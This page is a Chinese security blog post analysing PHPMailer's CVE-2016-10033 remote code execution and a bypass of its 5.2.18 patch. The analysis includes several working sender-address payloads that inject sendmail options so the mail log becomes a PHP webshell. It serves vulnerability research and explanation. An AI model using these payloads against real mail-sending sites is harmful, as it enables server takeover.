@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>phpmailer RCE 分析 | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近报了个CVE-2016-10033, 是phpmailer 远程命令执行漏洞, 从昨天开始, 分析了一波">
+<meta name="keywords" content="php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpmailer RCE 分析">
+<meta property="og:url" content="http://0x48.pw/2016/12/28/0x29/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="最近报了个CVE-2016-10033, 是phpmailer 远程命令执行漏洞, 从昨天开始, 分析了一波">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/mail1.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/mail2.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/mail3.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/mail4.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/mail5.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/mail6.png">
+<meta property="og:updated_time" content="2017-01-17T12:16:42.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpmailer RCE 分析">
+<meta name="twitter:description" content="最近报了个CVE-2016-10033, 是phpmailer 远程命令执行漏洞, 从昨天开始, 分析了一波">
+<meta name="twitter:image" content="http://qn.lazysheep.cc/img/mail1.png">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x29" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/12/28/0x29/" class="article-date">
+      <time datetime="2016-12-28T05:31:31.000Z" itemprop="datePublished">2016-12-28</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      phpmailer RCE 分析
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>最近报了个CVE-2016-10033, 是phpmailer 远程命令执行漏洞, 从昨天开始, 分析了一波</p>
+<a id="more"></a>
+<h2 id="CVE-2016-10033"><a href="#CVE-2016-10033" class="headerlink" title="CVE-2016-10033"></a>CVE-2016-10033</h2><p>首先来看最早的版本, 环境和exp之类的可见<a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="external">https://github.com/opsxcq/exploit-CVE-2016-10033</a></p>
+<p>触发该漏洞还有一系列要求:</p>
+<blockquote>
+<p>php version &lt; 5.2.0<br>no pcre<br>phpmailer &lt; 5.2.18<br>php safe_mode = false</p>
+</blockquote>
+<p>看着这一些列限制感觉这洞挺鸡肋的, 尤其是上面两个限制, php版本小于5.2, 已经很少见了, 默认情况下php是会编译安装pcre扩展的</p>
+<p>接下来仔细分析下该漏洞, 看exp可知, 该漏洞和前段时间的<a href="http://blog.knownsec.com/2016/12/roundcube-1-2-2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">Roundcube 1.2.2 远程命令执行漏洞</a> 相似, 都是由于php的mail函数的第5个参数的问题.</p>
+<p>然后开始定位:<br>代码位于文件class.phpmailer.php<br><img src="http://qn.lazysheep.cc/img/mail1.png" alt="mail1"></p>
+<p>从这里就可以看出上述第四个要求的原因, 如果开启了safe_mode, 则不会向mail函数传递第5个参数</p>
+<p>接下来跟踪变量<code>$params</code><br><img src="http://qn.lazysheep.cc/img/mail2.png" alt="mail2"></p>
+<p>变量<code>$params</code>来自于<code>$this-&gt;Sender</code></p>
+<p>继续跟踪:<br><img src="http://qn.lazysheep.cc/img/mail3.png" alt="mail3"></p>
+<p>变量<code>$this-&gt;Sender</code>是通过<code>setFrom</code>函数的第一个参数进行设置的</p>
+<p>在之前, 函数对<code>$address</code>是进行有效性判断的, 接下来进入这个地址有效性判断的函数中去看看</p>
+<p><img src="http://qn.lazysheep.cc/img/mail4.png" alt="mail4"></p>
+<p>从这段代码我们能知道, 如果<code>php version &lt; 5.2.0</code> and <code>no pcre</code>, 则<code>$patternselect = &#39;noregex&#39;</code></p>
+<p>继续往下看<br><img src="http://qn.lazysheep.cc/img/mail5.png" alt="mail5"></p>
+<p>当<code>$patternselect = &#39;noregex&#39;</code>时, 这判断太好过了, 差不多只要字符串中含有<code>@</code>, 就能返回true</p>
+<p>这样mail函数的第5个参数<code>$params</code>, 就能随意构造了</p>
+<p>接下来说说这类漏洞的原理</p>
+<p>php的mail函数默认情况下是通过执行sendmail命令(说是默认, 但为啥我在搭环境的时候php.ini中不设置<code>sendmail_path=/usr/sbin/sendmail -t -i</code> 就跑不起来?)</p>
+<p>第5个参数<code>$params</code>也是sendmail的参数(可参考man sendmail)</p>
+<p>这时候看exp就很好理解了:</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vulnerables@ -OQueueDirectory=<span class="regexp">/tmp -X/www</span><span class="regexp">/backdoor.php</span></div><div class="line"># -X 参数, 把日志写到/www<span class="regexp">/backdoor.php文件中</span></div></pre></td></tr></table></figure>
+<p>至于另一个-O参数, 在某些环境下需要<br>比如我搭的环境, 用的是debian, 默认情况下会出现<code>can not chdir(/var/spool/mqueue-client/): Permission denied</code>, 然后问了下p神, 他搭的环境用的是ubuntu, 不会报这个错误</p>
+<p>这是由于权限设置的问题, 研究了下<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ <span class="keyword">ls</span> -lF <span class="string">/var/spool</span></div><div class="line"><span class="string">.....</span></div><div class="line">drwxrws<span class="params">---</span>  2 smmsp smmsp 4096 Dec 28 14<span class="function">:24</span> mqueue-client/'</div><div class="line"></div><div class="line">$ chmod 777 <span class="string">/var/spool/mqueue-client</span></div></pre></td></tr></table></figure></p>
+<p>就不会出现这个错误了, 但是这就不是默认环境, 而是配置后的环境</p>
+<p>之后发现如果加上<code>-OQueueDirectory=/tmp</code> 参数就不会报这个错误了, 猜测应该是默认情况下<code>QueueDirectory=/var/spool/mqueue-client</code></p>
+<p>总结下, 日志文件写到一个php文件中, 而mail发送的信息中含有php代码, 那么这不就可以形成webshell了么.</p>
+<p>之后尝试了下能不能通过反引号进行命令执行, 没成功.</p>
+<h2 id="bypass-pcre8-正则"><a href="#bypass-pcre8-正则" class="headerlink" title="bypass pcre8 正则"></a>bypass pcre8 正则</h2><p>最初的版本太鸡肋了, 限制太多, 之后研究发现, 如果能bypass prce8 的正则, 那么限制条件不就可以减为:</p>
+<blockquote>
+<p>phpmailer &lt; 5.2.18<br>php safe_mode = false</p>
+</blockquote>
+<p>如果这样, 那么作用就大了, 昨天p神就已经发表了他的bypass payload(这里膜一下, 速度太快了, 我才刚开始研究, 他就出结果了)</p>
+<p>可以用这段代码来测试自己的payload:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">require</span> <span class="string">'src/PHPMailerAutoload.php'</span>;</div><div class="line">$mail = <span class="keyword">new</span> PHPMailer;</div><div class="line"></div><div class="line">$email = $_GET[<span class="string">'t'</span>];</div><div class="line">$r = $mail-&gt;setFrom($email, <span class="string">'Vulnerable Server'</span>);</div><div class="line">var_dump($r);</div><div class="line">var_dump($mail-&gt;Sender);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>昨晚我研究出了两张种bypass方案:</p>
+<blockquote>
+<p>a. -OQueueDirectory=/tmp/. -X/tmp/shell.php @a.com<br>() -OQueueDirectory=/tmp/. -X/tmp/shell.php @a.com</p>
+</blockquote>
+<p>再加上p神下午发的:</p>
+<blockquote>
+<p>a( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com</p>
+</blockquote>
+<p>然后看了下p神今天凌晨发的, 对比了下我已知的, 又多了一种</p>
+<blockquote>
+<p>“ -X/home/www/backdoor.php -OQueueDirectory=/tmp “@qq.com</p>
+</blockquote>
+<p>然后看了下github上的exp, 也进行了更新</p>
+<blockquote>
+<p>“vulnerables\” -OQueueDirectory=/tmp -X/www/backdoor.php server” @test.com</p>
+</blockquote>
+<h2 id="phpmailer-5-2-19-RCE"><a href="#phpmailer-5-2-19-RCE" class="headerlink" title="phpmailer 5.2.19 RCE"></a>phpmailer 5.2.19 RCE</h2><p>分析完这漏洞后, 然后去分析了源码patch, 然后发现, patch并啥用</p>
+<p>5.2.18的patch中, 唯一有用的代码是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$params = sprintf(<span class="string">'-f%s'</span>, escapeshellarg(<span class="keyword">$this</span>-&gt;Sender));</div></pre></td></tr></table></figure>
+<p>加了一个<code>escapeshellarg</code> 进行处理, 之前的<code>Roundcube 1.2.2 远程命令执行漏洞</code> 也是用相同的方法进行处理的</p>
+<p>但是我发现, 这个patch任然能bypass</p>
+<p>举例其中一个payload:</p>
+<blockquote>
+<p>a’( -OQueueDirectory=/tmp -X/tmp/backdoor.php )@a.com</p>
+</blockquote>
+<p>讲道理, 该payload被<code>escapeshellarg</code> 函数处理后是没问题的</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">php&gt; var_dump<span class="comment">(escapeshellarg("a'( -OQueueDirectory=/tmp -X/tmp/backdoor.php )</span>@a.com<span class="string">"))</span></div><div class="line">string(74) "<span class="string">'a'</span>\<span class="string">''</span><span class="comment">( -OQueueDirectory=/tmp -X/tmp/backdoor.php )</span>@a.com<span class="string">'"</span></div></pre></td></tr></table></figure>
+<p>然后带入sendmail<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sendmail <span class="_">-f</span><span class="string">'a'</span>\<span class="string">''</span>( -OQueueDirectory=/tmp -X/tmp/backdoor2.php )@a.com<span class="string">'</span></span></div><div class="line">Recipient names must be specified</div></pre></td></tr></table></figure></p>
+<p>发现并跑不起来, 日志文件也没成功写入</p>
+<p>但是传入mail函数中, 却能成功写入日志文件</p>
+<p>之后对mail.c源码进行了研究, 发现:</p>
+<p><img src="http://qn.lazysheep.cc/img/mail6.png" alt="mail6"></p>
+<p>在mail函数中, 对参数使用<code>php_escape_shell_cmd</code>进行处理</p>
+<p>我们可以进行测试下:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> test.php</span></div><div class="line">&lt;?php</div><div class="line"><span class="meta">$</span><span class="bash">payload = <span class="string">"a'( -OQueueDirectory=/tmp -X/tmp/backdoor.php )@a.com"</span>;</span></div><div class="line"><span class="meta">$</span><span class="bash">earg = escapeshellarg(<span class="variable">$payload</span>);</span></div><div class="line"><span class="meta">var_dump($</span><span class="bash">earg);</span></div><div class="line"><span class="meta">$</span><span class="bash">ecmd = escapeshellcmd(<span class="variable">$earg</span>);</span></div><div class="line"><span class="meta">var_dump($</span><span class="bash">ecmd);</span></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>得到:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ php test<span class="selector-class">.php</span></div><div class="line"><span class="function"><span class="title">string</span><span class="params">(<span class="number">58</span>)</span></span> <span class="string">"'a'\''( -OQueueDirectory=/tmp -X/tmp/backdoor.php )@a.com'"</span></div><div class="line"><span class="function"><span class="title">string</span><span class="params">(<span class="number">62</span>)</span></span> <span class="string">"'a'\\''\( -OQueueDirectory=/tmp -X/tmp/backdoor.php \)@a.com\'"</span></div><div class="line"></div><div class="line">$ sendmail -f<span class="string">'a'</span>\\<span class="string">''</span>\( -OQueueDirectory=/tmp -X/tmp/backdoor<span class="selector-class">.php</span> \)@<span class="selector-tag">a</span>.com\<span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p>发现sendmail能成功写入日志文件, 虽然会报一些错, 但无伤大雅, 数据能写到日志文件中</p>
+<p>从上面我们可以得到是<code>escapeshellarg</code> 和 <code>escapeshellcmd</code>函数一起处理参数, 导致的问题</p>
+<p>同理: Roundcube也存在该问题</p>
+<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>之后会对各大cms进行分析, 就目前分析过的两个Joomla和Wordpress来看, 并不是特别好利用</p>
+<ul>
+<li>Joomla中有phpmailer模块, 但是实际代码中却并未使用该模块</li>
+<li>Wordpress实际代码中使用了该模块, 而且还是5.2.14版本的, 但是设置参数的地方只有管理员能设置, 既然是管理员了, 要getshell又何必用这中麻烦的方法</li>
+</ul>
+<p>所以感觉该漏洞在我眼中目前看来只能算个中危吧, 因为并没有发现非常棒的实际利用场景</p>
+<p><em>参考</em></p>
+<ol>
+<li><a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="external">https://github.com/opsxcq/exploit-CVE-2016-10033</a> </li>
+<li><a href="https://linux.die.net/man/8/sendmail.sendmail" target="_blank" rel="external">https://linux.die.net/man/8/sendmail.sendmail</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html</a></li>
+<li><a href="https://github.com/php/php-src/blob/452dcf12ae3376a3cdb47490c51aadb0651a2a73/ext/standard/mail.c" target="_blank" rel="external">https://github.com/php/php-src/blob/452dcf12ae3376a3cdb47490c51aadb0651a2a73/ext/standard/mail.c</a></li>
+<li><a href="https://github.com/PHPMailer/PHPMailer/commit/4835657cd639fbd09afd33307cef164edf807cdc" target="_blank" rel="external">https://github.com/PHPMailer/PHPMailer/commit/4835657cd639fbd09afd33307cef164edf807cdc</a></li>
+</ol>
+<p>PS: 文章刚写完发现54分钟前有人申请cve了, <a href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html" target="_blank" rel="external">https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/12/28/0x29/">phpmailer RCE 分析</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-12-28, 13:31:31</p>
+        <p><span>最后更新:</span>2017-01-17, 20:16:42</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/12/28/0x29/" title="phpmailer RCE 分析">http://0x48.pw/2016/12/28/0x29/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/12/28/0x29/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2017/01/06/0x2a/">
+                    CVE-2016-6313 随机数预测分析
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/11/28/0x28/">
+                    2016 HCTF Crypto 出题总结
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-10033"><span class="toc-number">1.</span> <span class="toc-text">CVE-2016-10033</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-pcre8-正则"><span class="toc-number">2.</span> <span class="toc-text">bypass pcre8 正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmailer-5-2-19-RCE"><span class="toc-number">3.</span> <span class="toc-text">phpmailer 5.2.19 RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Other"><span class="toc-number">4.</span> <span class="toc-text">Other</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/01/06/0x2a/" title="上一篇: CVE-2016-6313 随机数预测分析">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/11/28/0x28/" title="下一篇: 2016 HCTF Crypto 出题总结">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code 